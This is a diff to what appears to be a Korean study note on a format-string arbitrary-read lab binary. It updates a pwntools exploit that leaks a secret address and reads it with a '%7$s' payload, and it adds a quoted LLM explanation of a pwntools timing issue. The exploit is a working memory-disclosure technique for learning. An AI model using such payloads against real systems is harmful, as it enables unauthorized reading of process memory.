@@ -172,7 +172,7 @@ from pwn import *
 
 p = process('./fsb_aar')
 
-p.recvuntil('`secret`: ')
+p.recvuntil(b'`secret`: ')
 secret_addr = int(p.recvline()[:-1].decode(),16)
 
 fstring = b'%7$s'.ljust(8)
@@ -181,3 +181,7 @@ fstring += p64(secret_addr)
 p.sendline(fstring)
 p.interactive()
 ```
+
+여기서, sendlineafter로 하면 작동을 안하는데, LLM에게 물어보니 다음과 같이 답변했다. 참고하자.
+
+> sendlineafter가 안 됐던 이유는 타이밍 문제였을 가능성이 높습니다. recvline()으로 주소를 읽고 난 직후 Format:  프롬프트가 이미 수신 버퍼에 도착해 있는데, sendlineafter가 그걸 받기 전에 타임아웃이 났거나 내부 버퍼 처리 순서가 꼬인 것입니다.
